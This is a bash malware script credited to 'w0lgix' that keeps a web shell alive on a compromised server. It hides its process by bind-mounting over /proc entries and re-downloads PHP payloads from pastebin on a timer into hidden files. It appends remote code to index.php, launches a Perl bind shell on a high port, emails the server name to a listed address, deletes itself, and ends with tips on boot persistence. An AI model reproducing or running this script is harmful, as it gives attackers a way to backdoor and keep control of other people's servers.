#!/bin/bash
#ⒶⓝⓄⓝⓢⓝⒾⓟⒺⓇⓢ.ⓒⓞⓜ
#u most u in root not using sudo and run first take root and run :)
############################################
#             Coded By w0lgix              #
############################################
i="0"
while [ $i -lt 4 ]
do
if [ -f $1 ];
then
	echo "file found"
elif [ $EUID -eq 0 ]
then
mkdir /root/.tmp
	old=$(expr $$ - 1)
        #new=$(expr $$ + 1)
        mount -o bind /root/.tmp /proc/$old
        mount -o bind /root/.tmp /proc/$$
        #mount -o bind /home/w0lgix/yy /proc/$new

	echo "file delete"
	wget "http://pastebin.com/raw/A5AydcwD" -O .inc.php
	wget "http://pastebin.com/raw/76inrqx8" -O .conf.php
	#mv index.html index.php
	#curl "http://pastebin.com/raw/X2L62eZ2" >> index.php
	#curl https://raw.githubusercontent.com/mhmadmasrwe/w0lgix-tool/master/bind.pl >> bind.pl
	#perl bind.pl "44444 1>/dev/null 2>&1 &"
	#wget "https://raw.githubusercontent.com/mhmadmasrwe/w0lgix-tool/master/Dos.c" -O Dos.c
	#gcc Dos.c -o Dos
	#chmod 755 Dos 
	#rm "bind.pl"
	echo $SERVER_NAME | mail -s 'the site delete your shell' mhmad.msarwe@yahoo.com
	rm $0
	while [ $i -lt 1 ]
	do
	wget "http://pastebin.com/raw/A5AydcwD" -O .inc.php
	sleep 43200
	wget "http://pastebin.com/raw/76inrqx8" -O .conf.php
	echo $$	| tee .color3.css
	done	

else


old=$(expr $$ - 1)

	echo "file delete"
	wget "http://pastebin.com/raw/A5AydcwD" -O .inc.php
	wget "http://pastebin.com/raw/76inrqx8" -O .conf.php
	mv index.html index.php
	curl "http://pastebin.com/raw/X2L62eZ2" >> index.php
	curl https://raw.githubusercontent.com/mhmadmasrwe/w0lgix-tool/master/bind.pl >> bind.pl
	perl bind.pl "65535 1>/dev/null 2>&1 &"
	#wget "https://raw.githubusercontent.com/mhmadmasrwe/w0lgix-tool/master/Dos.c" -O Dos.c
	#gcc Dos.c -o Dos
	#chmod 755 Dos 
	rm "bind.pl"
	echo $SERVER_NAME | mail -s 'the site delete your shell' mhmad.msarwe@yahoo.com
	rm "mining-lin.sh"
	while [ $i -lt 1 ]
	do
	wget "http://pastebin.com/raw/A5AydcwD" -O .inc.php
	sleep 300
	wget "http://pastebin.com/raw/76inrqx8" -O .conf.php
	echo $$	| .color3.css
	done	

fi
done

#for hide process name to kill u most know process pid
#mount -o bind /empty/dir /proc/42

#for work background
#setsid sh -c 'bash mining-lin.sh shell.php <> /dev/null >&0 2>&2"
#replace "-'

#for setup boot
#/etc/init.d/
#chmod 755 file
#update-rc.d file defaults
